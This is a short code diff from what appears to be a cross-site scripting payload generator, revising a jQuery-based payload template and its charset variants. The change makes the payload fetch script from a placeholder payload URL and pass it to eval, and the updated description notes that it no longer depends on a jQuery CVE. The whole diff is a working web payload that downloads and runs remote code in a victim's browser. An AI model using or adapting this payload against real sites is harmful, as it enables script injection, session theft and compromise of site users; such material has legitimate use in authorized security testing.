@@ -1,10 +1,10 @@
 import generateCharsets from '../lib/charsets/generate.js'
 import renderable from '../lib/renderable.js'
 
-const script = '$.get("$$PAYLOAD_URL$$")'
+const script = '$.get("$$PAYLOAD_URL$$",eval)'
 
 export default {
-    description: `Revised JQuery Get, depends on a version of JQuery with CVE-2015-9251`,
+    description: `JQuery Get and Eval, not dependent on CVEs`,
     script: renderable(script),
     charsets: generateCharsets(script)
 }
